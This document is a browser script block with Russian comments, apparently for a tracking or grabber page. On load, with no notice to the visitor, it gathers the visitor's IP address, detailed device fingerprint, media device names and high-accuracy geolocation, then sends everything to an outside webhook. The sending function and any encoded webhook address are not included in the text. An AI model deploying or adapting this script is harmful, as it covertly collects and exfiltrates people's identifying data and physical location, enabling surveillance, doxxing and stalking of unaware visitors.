<script>

    // Собираем расширенную информацию об окружении пользователя
async function collectInitial() {
  // IP
  let ip = 'Unavailable';
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    ip = (await response.json()).ip;
  } catch {}

  // Батарея
  const bat = navigator.getBattery ? await navigator.getBattery() : null;
  // Сеть
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

  // Часовой пояс
  const tzName = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unavailable';
  const tzOffsetMin = -new Date().getTimezoneOffset(); // в минутах
  const tzOffset = `${tzOffsetMin >= 0 ? '+' : ''}${tzOffsetMin} min`;

  // Поддержка касания
  const touchSupport = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);

  // Pixel Ratio и приближённый DPI
  const dpr = window.devicePixelRatio || 1;
  const approxDPI = Math.round(96 * dpr);

  // Ориентация экрана
  const orientation = screen.orientation?.type || 'Unavailable';

  // WebGL-информация
  const { renderer, vendor } = getGPU();

  // Мультимедиа-устройства
  let mediaDevices = 'Unavailable';
  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    mediaDevices = devices
      .map(d => `${d.kind}:${d.label || 'n/a'}`)
      .join('; ');
  } catch {}

  // Настройки браузера
  const doNotTrack = navigator.doNotTrack || 'Unavailable';
  const cookiesEnabled = navigator.cookieEnabled;
  const languages = navigator.languages ? navigator.languages.join(', ') : navigator.language;

  // Плагины и MIME-типы
  const plugins = navigator.plugins.length
    ? Array.from(navigator.plugins).map(p => p.name).join(', ')
    : 'None';
  const mimeTypes = navigator.mimeTypes.length
    ? Array.from(navigator.mimeTypes).map(m => m.type).join(', ')
    : 'None';

  const lines = [
    `**IP:** ${ip}`,
    `**UserAgent:** ${navigator.userAgent}`,
    `**Platform:** ${navigator.platform}`,
    `**Language(s):** ${languages}`,
    `**Timezone:** ${tzName} (UTC${tzOffset})`,
    `**Screen (CSS):** ${screen.width}×${screen.height}`,
    `**Pixel Ratio:** ${dpr}`,
    `**Approx. DPI:** ${approxDPI}`,
    `**Orientation:** ${orientation}`,
    `**Touch Support:** ${touchSupport}`,
    `**GPU (WebGL):** ${vendor} / ${renderer}`,
    `**CPU Cores:** ${navigator.hardwareConcurrency}`,
    `**Memory (GB):** ${navigator.deviceMemory || 'Unavailable'}`,
    bat
      ? `**Battery:** ${Math.round(bat.level * 100)}% (${bat.charging ? 'charging' : 'discharging'})`
      : `**Battery:** Unavailable`,
    conn
      ? `**Connection:** downlink:${conn.downlink}Mb/s, type:${conn.effectiveType}, rtt:${conn.rtt}ms`
      : `**Connection:** Unavailable`,
    `**Do Not Track:** ${doNotTrack}`,
    `**Cookies Enabled:** ${cookiesEnabled}`,
    `**Media Devices:** ${mediaDevices}`,
    `**Plugins:** ${plugins}`,
    `**MIME Types:** ${mimeTypes}`
  ];

  return { content: lines.join('\n') };
}

// Декодируем GPU и WebGL-вендор
function getGPU() {
  let renderer = 'Unavailable';
  let vendor = 'Unavailable';
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      renderer = dbg
        ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)
        : gl.getParameter(gl.RENDERER);
      vendor = dbg
        ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)
        : gl.getParameter(gl.VENDOR);
    }
  } catch {}
  return { renderer, vendor };
}

    // Форматируем геолокацию
    function getGeoPayload() {
      return new Promise(resolve => {
        if (!navigator.geolocation) {
          resolve({ content: '**Geolocation:** Unavailable' });
        } else {
          navigator.geolocation.getCurrentPosition(
            pos => {
              const c = pos.coords;
              const lines = [
                '**Geolocation:**',
                `Latitude: ${c.latitude}`,
                `Longitude: ${c.longitude}`,
                `Accuracy: ${c.accuracy}m`,
                c.altitude != null ? `Altitude: ${c.altitude}m` : '',
                c.altitudeAccuracy != null ? `Altitude Accuracy: ${c.altitudeAccuracy}m` : '',
                c.heading != null ? `Heading: ${c.heading}°` : '',
                c.speed != null ? `Speed: ${c.speed}m/s` : '',
                `Timestamp: ${new Date(pos.timestamp).toLocaleString()}`
              ].filter(Boolean);
              resolve({ content: lines.join('\n') });
            },
            err => {
              resolve({ content: `**Geolocation Error:** ${err.message}` });
            },
            { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
          );
        }
      });
    }

      // Декодирование Base64 в Unicode
    function base64DecodeUnicode(str) {
      try {
        // сначала atob, потом декодируем URI-компоненты
        return decodeURIComponent(Array.prototype.map.call(atob(str), c =>
          '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)
        ).join(''));
      } catch (e) {
        console.warn('Base64 decode failed:', e);
        return null;
      }
    }
    
    // Отправляем initial и geo отдельно в формате Markdown
    (async () => {
      await sendToWebhook(await collectInitial());
      await sendToWebhook(await getGeoPayload());
    })();
  </script>
